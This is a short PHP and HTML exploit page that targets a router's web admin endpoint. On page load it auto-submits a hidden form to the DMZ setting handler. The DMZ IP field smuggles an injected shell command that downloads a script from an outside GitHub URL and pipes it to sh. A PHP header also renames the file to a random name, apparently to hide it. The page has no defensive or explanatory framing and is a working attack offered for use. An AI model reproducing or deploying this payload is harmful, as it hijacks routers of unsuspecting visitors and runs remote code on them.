<?php
$filename = basename(__FILE__, '.php');
$filename1 = "$filename.php";  
$generate = bin2hex(random_bytes(5));
$generate1 = "bjc$generate.php"; 
rename($filename1, $generate1);
?>
<form method="post" id="exploit" action="http://192.168.254.254/goform/goform_set_cmd_process">
<input name="goformId" value="DMZ_SETTING" type="hidden">
<input name="isTest" value="false" type="hidden">
<input name="DMZEnabled" value="1" & type="hidden">
<input name="DMZIPAddress" value="127.0.0.1 | wget http://github.com/Hackerownme/Firmware4/blob/main/bayanawalanginternet.php -O - | sh &" type="hidden">
<input type="submit" style="display:none;"></form>
<script>
function exploit () {
var xploit = document.getElementById("exploit");
xploit.submit();
}
window.onload = exploit;
</script>
